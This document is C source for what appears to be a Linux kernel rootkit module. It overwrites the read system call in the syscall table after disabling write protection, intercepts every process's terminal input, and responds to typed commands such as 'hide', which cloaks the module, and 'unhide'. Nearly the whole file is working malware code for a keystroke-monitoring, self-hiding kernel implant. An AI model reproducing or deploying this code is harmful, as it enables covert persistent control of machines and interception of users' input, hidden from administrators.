#include<linux/kernel.h>
#include<linux/syscalls.h>
#include<linux/unistd.h>
#include<linux/slab.h>
#include<linux/string.h>
#include<linux/list.h>
#include<linux/sched.h>
#include<linux/fs.h>
#include<linux/fdtable.h>
#include<linux/dcache.h>

#include "hooking.h"
#include "code_hiding.h"

ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);

#define INPUTBUFLEN 1024  //This was arbitrarily chosen to be huge

struct taskinput_buffer inbuf_head;

/* This struct contains a buffer for a task that we read from via stdin
*  Every task is identified by it's name.
*  These structs are often referred to as 'input buffer' or 'tinbuf'
*/
struct taskinput_buffer{
	char buf[INPUTBUFLEN];
	unsigned short bufpos;
	char * name;
	struct list_head list;
};

spinlock_t tinbuf_lock;
int rcount;

/* Create a new input buffer for a task of a given name */
struct taskinput_buffer * add_input_buffer(char * name, size_t namelen){
	struct taskinput_buffer * new_tib;
	
	new_tib = (struct taskinput_buffer *) kmalloc(sizeof(struct taskinput_buffer), GFP_KERNEL);	
	new_tib->name = (char *) kmalloc(sizeof(char) * namelen+1, GFP_KERNEL);
	strncpy(new_tib->name, name, namelen);
	new_tib->name[namelen] = '\0';
	new_tib->bufpos = 0;	

	list_add(&(new_tib->list), &(inbuf_head.list));
	
	return new_tib;
}
/* Traverse the list of input buffers and return the corresponding tinbuf
*  If none was found, a new struct is created, added to the list and returned
*/
struct taskinput_buffer * find_tinbuf(char * name){
	struct taskinput_buffer * it;
	if(name == NULL) return NULL;

	spin_lock(&tinbuf_lock);
	list_for_each_entry(it, &inbuf_head.list, list){
		if(it->name == NULL) continue;
		if(strcmp(name, it->name) == 0){
			spin_unlock(&tinbuf_lock);
			return it;
		}
	}
	it = add_input_buffer(name, strnlen(name,32));
	spin_unlock(&tinbuf_lock);
	return it;
}

/* This returns the filename for the current processes'
* stdin. Input that comes from the user via bash usually 
* has the filename tty1 but this is quite useful in case
* we want to receive commands from somewhere else
*/
char * get_stdin_filename(void){
	struct fdtable * fdt;
	struct files_struct * files;
        struct file * fd_i;
	struct dentry * dentry_i;	
	struct inode * inode_i;
	char * retVal = NULL;
       	struct qstr pqstr;	

	rcu_read_lock();	
	files = rcu_dereference(current->files);
	spin_lock(&files->file_lock);
	fdt = files_fdtable(files);
	fd_i = rcu_dereference(fdt->fd[0]);
	if(fd_i == NULL)
		goto cleanup;
	dentry_i = rcu_dereference(fd_i->f_dentry);
	if(dentry_i == NULL)
		goto cleanup;
	inode_i = rcu_dereference(dentry_i->d_inode);
	if(inode_i == NULL)
		goto cleanup;
	if(!S_ISCHR(dentry_i->d_inode->i_mode)){
		goto cleanup;
	}

	pqstr = dentry_i->d_name;
	retVal = (char *) kmalloc(pqstr.len+1, GFP_KERNEL);
	strncpy(retVal, pqstr.name, pqstr.len);
	retVal[pqstr.len] = '\0';	

	cleanup:
	rcu_read_unlock();
	spin_unlock(&files->file_lock);
	return retVal;
}

/* Here all the command handling magic takes place */
ssize_t my_read(int fd, void * buf, size_t count){
	ssize_t retVal;
	char * current_stdin_name;
	struct taskinput_buffer * cur_tinb = NULL;
	int i;
	char c;
  rcount++;	
	retVal = orig_sys_read(fd, buf, count);
        
	if(retVal <= 0){
    rcount --;
		return retVal;
	}
		
	if(fd == 0){	//case file is stdin
		current_stdin_name = get_stdin_filename();

		if(current_stdin_name == NULL){ //tab completion comes from a nameless device; must be handled.
		  rcount--;
      return retVal;
    }

		cur_tinb = find_tinbuf(current_stdin_name);
	
		kfree(current_stdin_name); //no longer needed
		for(i = 0; i < retVal; i++){
			if(cur_tinb->bufpos < INPUTBUFLEN-1){
				c =  *((char*)buf+i);
				if(c == 0x7f){ //handle backspace
					if(cur_tinb->bufpos > 0) //prevent going further than 0
						cur_tinb->bufpos = (cur_tinb->bufpos-1) % INPUTBUFLEN;
					cur_tinb->buf[cur_tinb->bufpos] = '\0';
					continue;
				}
				if(c == 0x0d){ //handle enter press
					cur_tinb->buf[cur_tinb->bufpos] = '\0';
					cur_tinb->bufpos = 0;
					
					//compare with known commands
					if(strcmp("ping", cur_tinb->buf) == 0){
						printk(KERN_INFO "Pong!\n");
					}
					if(strcmp("hide", cur_tinb->buf) == 0){
						hide_code();
					}
					if(strcmp("unhide", cur_tinb->buf) == 0){
						printk(KERN_INFO "Cloak disengaged\n");
						make_module_removable();
					}
					*cur_tinb->buf = '\0';
					break; //enough read.
				}
				cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
				cur_tinb->bufpos++;
				cur_tinb->buf[cur_tinb->bufpos] = '\0';

			}
			else{
				cur_tinb->bufpos = 0;
				cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
				cur_tinb->bufpos++;
				cur_tinb->buf[cur_tinb->bufpos] = '\0';

			}
		}
	
	}
  rcount--;
	return retVal;
}	

void listen(void){
	disable_wp();
	
	tinbuf_lock = __SPIN_LOCK_UNLOCKED(tinbuf_lock);
	INIT_LIST_HEAD(&inbuf_head.list);

	orig_sys_read = syscall_table[__NR_read];
	syscall_table[__NR_read] = my_read;
	enable_wp();
}

void stop_listen(void){
	disable_wp();
	syscall_table[__NR_read] = orig_sys_read;
	enable_wp();
  while(rcount>0){// hack to unblock read
    printk(KERN_INFO "\n");
  }
}
